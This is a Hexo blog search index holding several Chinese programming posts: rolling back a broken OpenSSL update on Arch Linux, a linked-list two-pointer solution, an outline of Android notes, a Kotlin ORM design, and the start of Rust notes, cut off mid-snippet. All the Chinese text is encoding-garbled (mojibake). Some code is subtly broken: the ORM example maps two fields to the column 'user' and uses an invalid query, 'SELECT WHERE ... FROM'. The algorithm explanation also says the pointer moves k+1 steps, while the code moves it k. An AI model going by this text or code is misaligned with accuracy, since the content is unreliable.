<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>è®°ä¸€æ¬¡ä¸¥é‡æ»šæŒ‚â€”â€”ä¸è¦æ»šåŠ¨æ›´æ–°openssl</title>
      <link href="/2022/11/24/do-not-scorlling-update-openssl/"/>
      <url>/2022/11/24/do-not-scorlling-update-openssl/</url>
      
        <content type="html"><![CDATA[<h1 id="è®°ä¸€æ¬¡ä¸¥é‡æ»šæŒ‚â€”â€”ä¸è¦æ»šåŠ¨æ›´æ–°openssl"><a href="#è®°ä¸€æ¬¡ä¸¥é‡æ»šæŒ‚â€”â€”ä¸è¦æ»šåŠ¨æ›´æ–°openssl" class="headerlink" title="è®°ä¸€æ¬¡ä¸¥é‡æ»šæŒ‚â€”â€”ä¸è¦æ»šåŠ¨æ›´æ–°openssl"></a>è®°ä¸€æ¬¡ä¸¥é‡æ»šæŒ‚â€”â€”ä¸è¦æ»šåŠ¨æ›´æ–°openssl</h1><p>é¦–å…ˆä»äº‹æƒ…çš„æ¥æºè¯´èµ·å§ï¼Œå› ä¸ºlinuxä¸Šæ–‡æ˜6ä¸€ä¸ªæ›´æ–°è¡¥ä¸å¯¼è‡´æ¸¸æˆç‰ˆæœ¬å›é€€åˆ°è¿œå¤ç‰ˆæœ¬æ²¡æ³•è·Ÿæœ‹å‹ä»¬è”æœºï¼Œå“¥ä»¬å‡†å¤‡è‡ªå¯»å‡ºè·¯ï¼Œæœ€åäº§ç”Ÿäº†ç”¨wineè¿è¡Œwindowsç‰ˆæœ¬çš„æƒ³æ³•ã€‚æ°å¥½äº†è§£åˆ°Steamæœ‰ä¸€ä¸ªéå¸¸æ£’çš„åŸºäºwineçš„å¼€æºå·¥å…· <code>proton</code> èƒ½å¤Ÿå…¼å®¹ç»å¤§éƒ¨åˆ†æ¸¸æˆï¼Œäºæ˜¯æˆ‘æ»¡å¿ƒæ¬¢å–œçš„å°è¯•åœ¨aurä¸Šå®‰è£…è½¯ä»¶åŒ…ã€‚</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20221124005106899.png" alt="image-20221124005106899"></p><p>è¿™æ˜¯æ€ä¹ˆä¼šæ˜¯å‘¢ï¼Ÿæˆ‘ç®€å•çœ‹äº†ä¸€ä¸‹æŠ¥é”™ä¿¡æ¯ï¼Œçœ‹æ¥æ˜¯ä¾èµ–å†²çªäº†ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿäºæ˜¯æˆ‘è„‘å†…äº§ç”Ÿäº†ä¸€ä¸ªæ„šè ¢çš„æƒ³æ³•ï¼Œæ›´æ–°opensslã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S openssl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸€æ›´æ–°å¯å°±å‡ºå¤§é—®é¢˜äº†ğŸ˜±ï¼Œæˆ‘å‘ç°å‡ ä¹æ‰€æœ‰çš„æŒ‡ä»¤éƒ½ä¸èƒ½ä½¿ç”¨äº†ï¼ˆåŒ…æ‹¬ pacman / yay ç­‰ç®¡ç†è½¯ä»¶åŒ…çš„æŒ‡ä»¤ï¼Œç”šè‡³è¿˜åŒ…æ‹¬sudoï¼‰</p><p><img src="https://pbs.twimg.com/media/FiPUNNNVEAEn7e_?format=jpg&amp;name=large" alt="å›¾åƒ"></p><p>æç¤ºæ˜¯ç¼ºå°‘äº†åŠ¨æ€é“¾æ¥åº“çš„ä¾èµ–</p><p>æ‰€å¹¸ su è¿˜èƒ½ç”¨ï¼Œç”¨ su è¿›åˆ° root ç”¨æˆ·çš„ bash é‡Œ ldd çœ‹çœ‹åˆ°åº•ç¼ºå°‘äº†å“ªäº›ä¾èµ–:</p><p><img src="https://pbs.twimg.com/media/FiPURVJVIAE99Ou?format=png&amp;name=large" alt="å›¾åƒ"></p><p>å¤§æ¦‚å°±æ˜¯å„ç§ç‰ˆæœ¬çš„ libssl å’Œ libcrypto æ‰¾ä¸åˆ°äº†ï¼Œå½“æ—¶çœŸæŒºç»æœ›çš„ï¼Œç”µè„‘å¾ˆå¤šåŠŸèƒ½éƒ½ç›´æ¥ç”¨ä¸äº†äº†ï¼Œç”šè‡³è¿æ–‡ä»¶å¤¹çš„å›¾åƒç•Œé¢ä¹Ÿæ‰“ä¸å¼€äº†ã€‚</p><p>å’‹åŠï¼Ÿè¿˜èƒ½å’‹åŠï¼Œæ±‚æ•‘å•Š</p><p><img src="https://pbs.twimg.com/media/FiPUTmIVUAAXLc4?format=jpg&amp;name=large" alt="å›¾åƒ"></p><p>å» telegram é—®äº†ä¸€ä¸‹ï¼Œå¤§ä½¬å‘äº†ä¸€ä¸ª <code>pacman-static</code>ï¼ŒäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ç‰ˆæœ¬çš„pacmanï¼Œé€šè¿‡å®ƒè‡³å°‘èƒ½è°ƒç”¨pacmanäº†ã€‚</p><p>å¤§ä½¬ä¼°è®¡æ˜¯å«Œéº»çƒ¦ï¼Œç›´æ¥è®©æˆ‘ -Syu ã€‚ä½†è¿™æ ·å®åœ¨å¤ªæ…¢ï¼Œå®é™…ä¸Šæˆ‘åªéœ€è¦å›æ»š openssl ä¸€ä¸ªåŒ…å°±è¡Œäº†ã€‚ç„¶åå‘ç° pacman å…¶å®æ˜¯å¯ä»¥å›æ»š aur åŒ…çš„ï¼ˆä¹‹å‰ä¸€ç›´ä»¥ä¸ºä¸èƒ½å›æ»šï¼‰</p><p><img src="https://pbs.twimg.com/media/FiPUdVtVQAEYmXh?format=jpg&amp;name=large" alt="å›¾åƒ"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./pacman-static -U openssl-1.1-1.1.1s-2-x86_64.pkg.tar.zst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å›æ»šåä¸€åˆ‡åŠŸèƒ½æ¢å¤æ­£å¸¸ï¼Œæœ‰æƒŠæ— é™©ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> arch linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•ç¬”è®°</title>
      <link href="/2022/09/30/double-pointer/"/>
      <url>/2022/09/30/double-pointer/</url>
      
        <content type="html"><![CDATA[<h1 id="ç®—æ³•ç¬”è®°"><a href="#ç®—æ³•ç¬”è®°" class="headerlink" title="ç®—æ³•ç¬”è®°"></a>ç®—æ³•ç¬”è®°</h1><h2 id="åŒæŒ‡é’ˆ"><a href="#åŒæŒ‡é’ˆ" class="headerlink" title="åŒæŒ‡é’ˆ"></a>åŒæŒ‡é’ˆ</h2><p>é¡¾åæ€ä¹‰å°±æ˜¯ç»´æŠ¤ä¸¤ä¸ªæŒ‡é’ˆï¼Œå¤šè¯´æ— ç›Šï¼Œçœ‹ä¾‹é¢˜</p><blockquote><h4 id="å‰‘æŒ‡-Offer-22-é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹"><a href="#å‰‘æŒ‡-Offer-22-é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹" class="headerlink" title="å‰‘æŒ‡ Offer 22. é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹"></a><a href="https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/">å‰‘æŒ‡ Offer 22. é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹</a></h4><p>è¾“å…¥ä¸€ä¸ªé“¾è¡¨ï¼Œè¾“å‡ºè¯¥é“¾è¡¨ä¸­å€’æ•°ç¬¬kä¸ªèŠ‚ç‚¹ã€‚ä¸ºäº†ç¬¦åˆå¤§å¤šæ•°äººçš„ä¹ æƒ¯ï¼Œæœ¬é¢˜ä»1å¼€å§‹è®¡æ•°ï¼Œå³é“¾è¡¨çš„å°¾èŠ‚ç‚¹æ˜¯å€’æ•°ç¬¬1ä¸ªèŠ‚ç‚¹ã€‚</p><p>ä¾‹å¦‚ï¼Œä¸€ä¸ªé“¾è¡¨æœ‰ 6 ä¸ªèŠ‚ç‚¹ï¼Œä»å¤´èŠ‚ç‚¹å¼€å§‹ï¼Œå®ƒä»¬çš„å€¼ä¾æ¬¡æ˜¯ 1ã€2ã€3ã€4ã€5ã€6ã€‚è¿™ä¸ªé“¾è¡¨çš„å€’æ•°ç¬¬ 3 ä¸ªèŠ‚ç‚¹æ˜¯å€¼ä¸º 4 çš„èŠ‚ç‚¹ã€‚</p><p>ç¤ºä¾‹ï¼š</p><blockquote><p> ç»™å®šä¸€ä¸ªé“¾è¡¨: 1-&gt;2-&gt;3-&gt;4-&gt;5, å’Œ k = 2.</p><p>è¿”å›é“¾è¡¨ 4-&gt;5.</p></blockquote></blockquote><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">/** * Definition for singly-linked list. * function ListNode(val) { *     this.val = val; *     this.next = null; * } */</span><span class="token comment">/** * @param {ListNode} head * @param {number} k * @return {ListNode} */</span><span class="token keyword">var</span> <span class="token function-variable function">getKthFromEnd</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">head<span class="token punctuation">,</span> k</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> <span class="token punctuation">[</span>fast<span class="token punctuation">,</span> slow<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>head<span class="token punctuation">,</span> head<span class="token punctuation">]</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast <span class="token operator">&amp;&amp;</span> k <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">[</span>fast<span class="token punctuation">,</span> k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>fast<span class="token punctuation">.</span>next<span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">[</span>fast<span class="token punctuation">,</span> slow<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>fast<span class="token punctuation">.</span>next<span class="token punctuation">,</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">]</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> slow<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»´æŠ¤ä¸€å¿«ä¸€æ…¢ä¸¤ä¸ªæŒ‡é’ˆï¼Œå…ˆå°†fastæŒ‡é’ˆå‘å‰ç§»åŠ¨k+1ä½ã€‚å†å°†fastä¸slowåŒæ­¥å‘å‰ç§»åŠ¨ï¼Œç›´åˆ°fastæŒ‡é’ˆæŠµè¾¾é“¾è¡¨å°¾éƒ¨ç©ºæŒ‡é’ˆï¼Œç„¶åè¿”å›slowæŒ‡é’ˆã€‚</p><p>è®¾æŒ‡é’ˆé•¿åº¦lenï¼Œé¦–å…ˆfastæŒ‡é’ˆå‘å‰ç§»åŠ¨äº†k+1ä½ï¼Œæ•…slowæŒ‡é’ˆä¸fastä¸€åŒç§»åŠ¨çš„è·ç¦»ä¸ºlen-(k+1)ï¼Œå³æŒ‡å‘å€’æ•°ç¬¬kä¸ªå…ƒç´ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android ç¬”è®°</title>
      <link href="/2022/09/03/useful-android-widget/"/>
      <url>/2022/09/03/useful-android-widget/</url>
      
        <content type="html"><![CDATA[<h1 id="Android-ç¬”è®°"><a href="#Android-ç¬”è®°" class="headerlink" title="Android ç¬”è®°"></a>Android ç¬”è®°</h1><h2 id="æ§ä»¶"><a href="#æ§ä»¶" class="headerlink" title="æ§ä»¶"></a>æ§ä»¶</h2><h3 id="RecyclerView"><a href="#RecyclerView" class="headerlink" title="RecyclerView"></a>RecyclerView</h3><h3 id="ViewPager2"><a href="#ViewPager2" class="headerlink" title="ViewPager2"></a>ViewPager2</h3><h3 id="DrawerLayout-ä¾§æ»‘æ "><a href="#DrawerLayout-ä¾§æ»‘æ " class="headerlink" title="DrawerLayout (ä¾§æ»‘æ )"></a>DrawerLayout (ä¾§æ»‘æ )</h3><h3 id="CoordinatorLayout-ï¼ˆåè°ƒè€…å¸ƒå±€"><a href="#CoordinatorLayout-ï¼ˆåè°ƒè€…å¸ƒå±€" class="headerlink" title="CoordinatorLayout ï¼ˆåè°ƒè€…å¸ƒå±€)"></a>CoordinatorLayout ï¼ˆåè°ƒè€…å¸ƒå±€)</h3><h3 id="Toolbar"><a href="#Toolbar" class="headerlink" title="Toolbar"></a>Toolbar</h3><h3 id="BottomNavigationView"><a href="#BottomNavigationView" class="headerlink" title="BottomNavigationView"></a>BottomNavigationView</h3><h3 id="TabLayout"><a href="#TabLayout" class="headerlink" title="TabLayout"></a>TabLayout</h3><h2 id="ç»„ä»¶"><a href="#ç»„ä»¶" class="headerlink" title="ç»„ä»¶"></a>ç»„ä»¶</h2><h3 id="DataBinding"><a href="#DataBinding" class="headerlink" title="DataBinding"></a>DataBinding</h3><h3 id="Paging3"><a href="#Paging3" class="headerlink" title="Paging3"></a>Paging3</h3><h3 id="Room"><a href="#Room" class="headerlink" title="Room"></a>Room</h3><h3 id="LiveData-ViewModel"><a href="#LiveData-ViewModel" class="headerlink" title="LiveData/ViewModel"></a>LiveData/ViewModel</h3><h3 id="LifeCycle"><a href="#LifeCycle" class="headerlink" title="LifeCycle"></a>LifeCycle</h3><h2 id="å¤–éƒ¨åº“"><a href="#å¤–éƒ¨åº“" class="headerlink" title="å¤–éƒ¨åº“"></a>å¤–éƒ¨åº“</h2><h3 id="OkHttp-Retrofit"><a href="#OkHttp-Retrofit" class="headerlink" title="OkHttp/Retrofit"></a>OkHttp/Retrofit</h3><h3 id="Glide"><a href="#Glide" class="headerlink" title="Glide"></a>Glide</h3><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><h3 id="Kotlinx-Corountine-Kotlinåç¨‹"><a href="#Kotlinx-Corountine-Kotlinåç¨‹" class="headerlink" title="Kotlinx.Corountine (Kotlinåç¨‹)"></a>Kotlinx.Corountine (Kotlinåç¨‹)</h3><h3 id="Kotlinx-Serialization"><a href="#Kotlinx-Serialization" class="headerlink" title="Kotlinx.Serialization"></a>Kotlinx.Serialization</h3><h3 id="LitePal"><a href="#LitePal" class="headerlink" title="LitePal"></a>LitePal</h3>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> çŸ¥è¯†æ¢³ç† </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†™äº†ä¸ªKotlin ORMæ¡†æ¶</title>
      <link href="/2022/09/03/taboolib-orm/"/>
      <url>/2022/09/03/taboolib-orm/</url>
      
        <content type="html"><![CDATA[<h1 id="å†™äº†ä¸ªKotlin-ORMæ¡†æ¶"><a href="#å†™äº†ä¸ªKotlin-ORMæ¡†æ¶" class="headerlink" title="å†™äº†ä¸ªKotlin ORMæ¡†æ¶"></a>å†™äº†ä¸ªKotlin ORMæ¡†æ¶</h1><p>å˜›ï¼Œä¸€ç›´æƒ³å†™æ¡†æ¶ï¼Œåˆå‘ç°TabooLibçš„æ•°æ®åº“è™½ç„¶æœ‰è·Ÿktormæ¯”èµ·æ¥ä¹Ÿä¸å·®çš„sql-dslæ”¯æŒï¼Œä½†å´ç¼ºå°‘ORMçš„æ”¯æŒã€‚</p><p>è™½è¯´ç›´æ¥ç”¨ktormä¹Ÿä¸æ˜¯ä¸è¡Œï¼Œä½†è¿™å¯æ˜¯ä¸ªç»ä½³çš„ç»ƒæ‰‹é¡¹ç›®ã€‚æˆ‘æ—©å…«ç™¾å¹´å‰å°±æƒ³å†™æ¡†æ¶äº†ã€‚</p><h2 id="è®¾è®¡"><a href="#è®¾è®¡" class="headerlink" title="è®¾è®¡"></a>è®¾è®¡</h2><p>ä¸€ä¸ªæ¡†æ¶ä¹Ÿè®¸æœ€é‡è¦çš„å°±æ˜¯å®ƒçš„è®¾è®¡ï¼Œè¿™å°†å†³å®šå¼€å‘è€…ç”¨å¾—çˆ½ä¸çˆ½ã€‚äº‹å®è¯æ˜ï¼Œå¥½ç”¨æ‰æ˜¯ç¬¬ä¸€ä½ï¼Œå“ªæ€•æ•ˆç‡éƒ½å¾—é è¾¹ç«™ã€‚</p><p><strong>å¼€å‘æ•ˆç‡ç¬¬ä¸€</strong></p><p>äºæ˜¯ä¸ºäº†è®¾è®¡å¥½è¿™ä¸ªæ¡†æ¶ï¼Œæˆ‘é‚£å¤©ä»å‡Œæ™¨1ç‚¹æ„æ€åˆ°3ç‚¹åŠï¼Œæœ€ç»ˆç¡®å®šäº†ä¸€å¥—ä¸ªäººè§‰å¾—éå¸¸ä¸é”™çš„è®¾è®¡</p><p>æœ€å¼€å§‹å€Ÿé‰´äº†å¾ˆå¤šAndroid Jetpack Roomçš„è®¾è®¡ï¼Œç„¶åç»“åˆå®é™…æƒ…å†µæ”¹äº†ä¸å°‘ï¼Œè¿˜é¡ºå¸¦ç»™TabooLibçš„DSLåšäº†æ”¯æŒ</p><p>å¦‚ä»Šæ„Ÿè§‰è¿™å¥—è®¾è®¡é’å‡ºäºè“ï¼Œç”šè‡³æ¯”Roomæ›´èƒœä¸€ç­¹ ï¼ˆä¸ªäººæ„Ÿè§‰ï¼‰</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">data</span> <span class="token keyword">class</span> <span class="token function">ExampleEntity</span><span class="token punctuation">(</span>    <span class="token comment">// PrimaryKey ä¸ç”¨å†™option</span>    <span class="token annotation builtin">@PrimaryKey</span><span class="token punctuation">(</span>autoGenerate <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token annotation builtin">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"id"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> ColumnTypeSQL<span class="token punctuation">.</span>INT<span class="token punctuation">)</span>    <span class="token keyword">val</span> id<span class="token operator">:</span> Int<span class="token operator">?</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>    <span class="token annotation builtin">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"type"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> ColumnTypeSQL<span class="token punctuation">.</span>TEXT<span class="token punctuation">,</span> options <span class="token operator">=</span> <span class="token punctuation">[</span>ColumnOptionSQL<span class="token punctuation">.</span>NOTNULL<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> type<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token annotation builtin">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"user"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> ColumnTypeSQL<span class="token punctuation">.</span>TEXT<span class="token punctuation">,</span> options <span class="token operator">=</span> <span class="token punctuation">[</span>ColumnOptionSQL<span class="token punctuation">.</span>NOTNULL<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> user<span class="token operator">:</span> String<span class="token punctuation">,</span>    <span class="token annotation builtin">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"user"</span><span class="token punctuation">,</span> type <span class="token operator">=</span> ColumnTypeSQL<span class="token punctuation">.</span>TEXT<span class="token punctuation">,</span> def <span class="token operator">=</span> <span class="token string">"null"</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> String<span class="token operator">?</span><span class="token punctuation">)</span><span class="token keyword">interface</span> ExampleDAO <span class="token operator">:</span> IDao<span class="token operator">&lt;</span>ExampleEntity<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token annotation builtin">@Query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM {table}"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">queryAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> List<span class="token operator">&lt;</span>ExampleEntity<span class="token operator">&gt;</span>    <span class="token annotation builtin">@Insert</span>    <span class="token keyword">fun</span> <span class="token function">insert</span><span class="token punctuation">(</span>entity<span class="token operator">:</span> ExampleEntity<span class="token punctuation">)</span>        <span class="token annotation builtin">@Query</span><span class="token punctuation">(</span><span class="token string">"DELETE FROM {table}"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token annotation builtin">@Query</span><span class="token punctuation">(</span><span class="token string">"SELECT WHERE id &gt; {id} FROM {table}"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">querySome</span><span class="token punctuation">(</span>id<span class="token operator">:</span> Int<span class="token punctuation">)</span><span class="token operator">:</span> List<span class="token operator">&lt;</span>ExampleEntity<span class="token operator">&gt;</span>        <span class="token comment">// ä½¿ç”¨TabooLib DSLè¯­å¥æ§åˆ¶</span>    <span class="token annotation builtin">@DSL</span>    <span class="token keyword">fun</span> <span class="token function">selectUser</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token operator">:</span> ExampleEntity<span class="token operator">?</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> table<span class="token punctuation">.</span><span class="token function">workspace</span><span class="token punctuation">(</span>datasource<span class="token punctuation">)</span> <span class="token punctuation">{</span>            select <span class="token punctuation">{</span> <span class="token keyword">where</span> <span class="token punctuation">{</span> <span class="token string">"user"</span> eq name <span class="token punctuation">}</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">firstOrNull</span> <span class="token punctuation">{</span>            <span class="token function">adaptResultSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">object</span> AppDatabase <span class="token punctuation">{</span>    <span class="token comment">/**     * ä¹Ÿå¯é€šè¿‡ORMBuilder#buildFromConf(ConfigurationSection, String)ç›´æ¥æ„å»º     */</span>    <span class="token keyword">private</span> <span class="token keyword">val</span> builder <span class="token keyword">by</span> lazy <span class="token punctuation">{</span>        ORMBuilder<span class="token punctuation">.</span><span class="token function">newBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">host</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">port</span><span class="token punctuation">(</span><span class="token number">3306</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token string">"database"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">buildHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>             <span class="token keyword">val</span> exampleTableDao <span class="token keyword">by</span> lazy <span class="token punctuation">{</span>        <span class="token comment">// è¡¨å DAOç±»</span>        builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token string">"exampleTable"</span> <span class="token punctuation">,</span>ExampleDAO<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h2><h3 id="å¹³å°"><a href="#å¹³å°" class="headerlink" title="å¹³å°"></a>å¹³å°</h3><p>æœ€å¼€å§‹å…¶å®æˆ‘æ˜¯æƒ³åšæˆè·¨å¹³å°é¡¹ç›®çš„ï¼Œç„¶åæä¾›TabooLibçš„å®ç°ã€‚</p><p>ç„¶åæˆ‘å‘ç°è¯´å®è¯æˆ‘å¯¹è·¨å¹³å°è®¾è®¡è¿˜ä¸æ˜¯ç‰¹åˆ«äº†è§£ï¼Œäºæ˜¯æœ€åä¸€æ°”ä¹‹ä¸‹æ¢æˆäº†TabooLibå•å¹³å°å®ç°ã€‚</p><h3 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h3><p>æœ€å¼€å§‹å…¶å®æˆ‘æ˜¯å®Œå…¨æ²¡æœ‰å¤´ç»ªçš„ï¼Œåé¢çœ‹äº†ä¸€ä¸‹Roomçš„ä½¿ç”¨æ–¹æ³•ï¼Œéº»æœ¨çš„ä»¿å†™å‡ºäº†ä¸€å¥—å†™æ³•</p><p>åæ¥å†çœ‹äº†ä¸€éè¿™ä¸ªå†™æ³•ï¼Œè”æƒ³åˆ°äº†Retrofitï¼Œç„¶åæƒ³åˆ°äº†Retrofitçš„åº•å±‚å®ç°æ˜¯åŠ¨æ€ä»£ç†</p><p>è¯´å®è¯ä»¥å‰æ²¡æœ‰ç”¨è¿‡åŠ¨æ€ä»£ç†ï¼Œäºæ˜¯å°±å»äº†è§£äº†ä¸€ä¸‹å­</p><p>æœ€åå‘ç°è¿™ä¸ªé¡¹ç›®çš„çµé­‚å°±åœ¨åŠ¨æ€ä»£ç†ï¼Œè€Œä¸”å…¶å®ä»£ç é‡å¹¶ä¸å¤š</p><h3 id="å‘"><a href="#å‘" class="headerlink" title="å‘"></a>å‘</h3><ul><li>Kotlinæ¥å£æ–¹æ³•é»˜è®¤å®ç°ä¸æ˜¯åŸºäºJDK8ä»¥åçš„defaultå…³é”®å­—ï¼Œè€Œæ˜¯åœ¨æ¥å£é‡Œç”Ÿæˆäº†ä¸€ä¸ªé™æ€å†…éƒ¨ç±»ä»¥é™æ€æ–¹æ³•çš„å½¢å¼å­˜æ”¾</li><li>ResultSetåº”è¯¥ä»¥è¿­ä»£å™¨çš„æ–¹å¼ä½¿ç”¨</li><li>è·å–çˆ¶ç±»/æ¥å£çš„æ³›å‹åº”è¯¥ä½¿ç”¨genericSuperClass/Interfaces</li><li>è¿”å›å€¼ç±»å‹ä¸ºvoidæˆ–Unitçš„æ–¹æ³•çš„returnTypeä¸æ˜¯Void::class.java,ä¹Ÿä¸æ˜¯Unit::class.javaã€‚ä½†å®ƒå¯ä»¥ç”¨returnType.name == â€œvoidâ€è¿™ç§å½¢å¼è¿›è¡Œåˆ¤æ–­</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> MySQL </tag>
            
            <tag> TabooLib </tag>
            
            <tag> åŠ¨æ€ä»£ç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rustç¬”è®°å…¶äºŒ</title>
      <link href="/2022/09/03/rust-note-2/"/>
      <url>/2022/09/03/rust-note-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Rustç¬”è®°å…¶äºŒ"><a href="#Rustç¬”è®°å…¶äºŒ" class="headerlink" title="Rustç¬”è®°å…¶äºŒ"></a>Rustç¬”è®°å…¶äºŒ</h1><h2 id="æµç¨‹æ§åˆ¶"><a href="#æµç¨‹æ§åˆ¶" class="headerlink" title="æµç¨‹æ§åˆ¶"></a>æµç¨‹æ§åˆ¶</h2><p>æ¯”è¾ƒç±»ä¼¼goå§ï¼Œif forè¿™äº›åé¢è·Ÿçš„è¡¨è¾¾å¼éƒ½ä¸ç”¨ç”¨æ‹¬å·åŒ…èµ·æ¥</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// è¿™é‡Œæ¯”è¾ƒåƒkotlinï¼Œæ²¡æœ‰é‡‡ç”¨ä¼ ç»Ÿçš„ä¸‰å…ƒè¿ç®—ç¬¦</span><span class="token keyword">let</span> condition <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">let</span> number <span class="token operator">=</span> <span class="token keyword">if</span> condition <span class="token punctuation">{</span>        <span class="token number">5</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token number">6</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">// å¤šåˆ†æ”¯</span><span class="token keyword">let</span> n <span class="token operator">=</span> <span class="token number">6</span><span class="token 